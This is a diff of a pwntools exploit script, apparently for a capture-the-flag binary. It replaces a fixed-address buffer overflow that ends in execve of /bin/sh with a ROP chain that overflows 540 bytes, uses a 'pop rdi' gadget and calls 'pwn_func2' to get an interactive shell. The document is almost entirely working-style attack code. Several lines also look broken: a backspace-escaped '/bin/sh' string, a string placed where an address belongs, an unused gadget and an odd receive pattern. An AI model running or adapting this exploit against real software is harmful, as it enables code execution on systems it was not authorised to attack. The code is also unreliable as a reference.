@@ -1,25 +1,31 @@
-import pwn
-import os
+#!/usr/bin/env python3
+import sys
+from pwn import *
 
-shell_path = "/bin/sh"
+exe = sys.argv[1]
+elf = ELF(exe)
+pwnfunc2 = elf.symbols['pwn_func2']
+rop = ROP(elf)
 
-challenge = pwn.process("my_vm2")
+rdi = rop.rdi
 
-pwn_func1 = pwn.p64(0x402501)
+rdi2 = rop.find_gadget(["mov rdi, rax", "ret"])
 
-payload = b"prints "
-payload += b"A"*540 
-payload += (1).to_bytes(4, byteorder='little')
-payload += b"A"*8
-payload += pwn_func1
 
-challenge.sendline(payload + b"\nexec")
-challenge.interactive()
-
-command = "-c 'echo + {challenge}'"
-
-with open("exploit.insn","wb") as f:
-  f.write(payload + b"\nexec")
-
-args = [shell_path, command]
-os.execve(shell_path, args, os.environ)
+payload = (b'prints '
+            + (b'\xff' * 540)
+            + (b'\0' * 4)
+            + (b'\0' * 8)
+            + p64(rdi.address)
+            + b'\bin\sh$'
+            + p64(pwnfunc2)
+          )
+print(f"PAYLOAD: {payload}")
+with open("/dev/null") as err:
+  io = process(exe,stderr=err)
+  io.sendline(payload)
+  io.recvuntil(b'Enter command: ')
+  io.send(b'exec\n')
+  out1 = io.recvuntil('b\n')
+  out2 = io.recvuntil((b'Enter command: ', b'\n'))
+io.interactive()
